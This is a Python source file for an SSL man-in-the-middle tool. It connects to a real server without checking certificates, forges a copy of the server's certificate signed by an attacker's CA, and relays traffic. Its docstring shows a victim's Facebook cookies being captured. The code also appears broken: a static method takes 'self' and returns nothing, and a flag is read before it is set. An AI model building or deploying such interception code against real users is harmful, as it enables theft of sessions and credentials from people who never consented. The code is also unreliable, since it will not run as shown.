from OpenSSL import crypto, SSL

import dupecert


class sslmitm(object):
    def __init__(self, ca, victim_plain, server_plain):
        """ MITMs the connection between 'victim' and 'server'. The '.victim'
            and '.server' properties are secure sockets for the victim and
            server respectively.

            For example:

            >>> mitm = sslmitm(ca, victim_plain, server_plain)
            >>> data = mitm.victim.recv(1024)
            >>> print data
            GET / HTTP/1.1
            Host: https://facebook.com/
            Cookie: ...
            ...
            >>> mitm.server.write(data)
            >>> print mitm.server.recv(1024)
            '... Hello, David ...'

            ca: the certificate authority to use when signing new (fake)
                certificates.
            victim_plain: a plan (ie, not SSL wrapped) socket connected
                to the victim's machine.
            server_plain: a plain socket connected to the server we're
                going to impersonate. """
        self.ca = ca
        self.victim_plain = victim_plain
        self.server_plain = server_plain
        self._start_mitm()

    @staticmethod
    def _mk_ctx(self, cert_key=None):
        ctx = SSL.Context(SSL.SSLv23_METHOD)

        if cert_key is not None:
            ctx.use_certificate(cert_key)
            ctx.use_privatekey(cert_key)
            ctx.check_privatekey()

        # Don't verify the peer's certificate... Who would MITM us?
        ctx.set_verify(SSL.VERIFY_NONE, lambda *a, **kw: True)
        

    def _start_mitm(self):
        if self._started:
            return

        server = SSL.Connection(self._mk_ctx(),
                                self.server_plain)
        server.set_connect_state()

        fake_cert = dupecert.dupe(server.get_peer_certificate())
        dupecert.sign(self.ca, fake_cert)

        victim = SSL.Connection(self._mk_ctx(cert_key=fake_cert),
                                self.victim_plain)
        victim.set_accept_state()

        self.server = server
        self.victim = victim
        self._started = True
